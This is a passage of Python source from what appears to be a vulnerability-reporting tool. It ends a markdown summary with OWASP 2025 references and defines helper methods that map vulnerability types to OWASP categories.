6. Conduct regular security assessments using OWASP 2025 framework

## References
- [OWASP Top 10 2025](https://owasp.org/Top10/2025/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

"""
        return summary
    
    def get_owasp_category_for_vuln(self, vuln_type: str) -> Optional[str]:
        """
        Public method to get OWASP 2025 category for a vulnerability type.
        
        Args:
            vuln_type: The vulnerability type string
            
        Returns:
            OWASP 2025 category string or None
        """
        return self._get_owasp_category(vuln_type)
    
    def get_all_owasp_categories(self) -> Dict:
        """
        Get all OWASP 2025 categories and their associated vulnerability types.
        
        Returns:
            Dictionary of OWASP categories
        """
        return OWASP_2025_CATEGORIES